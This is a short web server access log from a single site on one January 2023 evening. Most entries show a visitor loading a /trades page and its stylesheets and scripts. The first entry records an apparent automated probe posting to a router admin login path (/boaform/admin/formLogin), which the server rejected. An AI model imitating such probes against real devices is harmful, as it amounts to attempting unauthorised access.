205.185.118.237 - - [21/Jan/2023:20:03:06 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://23.111.202.27:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.239.49.219 - - [21/Jan/2023:20:39:40 +0000] "GET /trades HTTP/1.1" 200 5803 "http://23.111.202.27/index.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:40 +0000] "GET /static/css/main.css HTTP/1.1" 200 1976 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/css/vendors/prism/prism.css HTTP/1.1" 200 1173 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/css/user.min.css HTTP/1.1" 404 436 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/css/theme.min.css HTTP/1.1" 200 42985 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/css/example-styles.css HTTP/1.1" 200 1027 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/css/util.css HTTP/1.1" 200 12440 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/css/vendors/swiper/swiper-bundle.min.css HTTP/1.1" 200 4472 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/css/table.css HTTP/1.1" 200 1469 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/js/src/jquery-2.2.4.min.js HTTP/1.1" 200 30120 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/js/src/jquery.multi-select.js HTTP/1.1" 200 3574 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
84.239.49.219 - - [21/Jan/2023:20:39:41 +0000] "GET /static/js/vendors/popper/popper.min.js HTTP/1.1" 200 7514 "http://23.111.202.27/trades" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
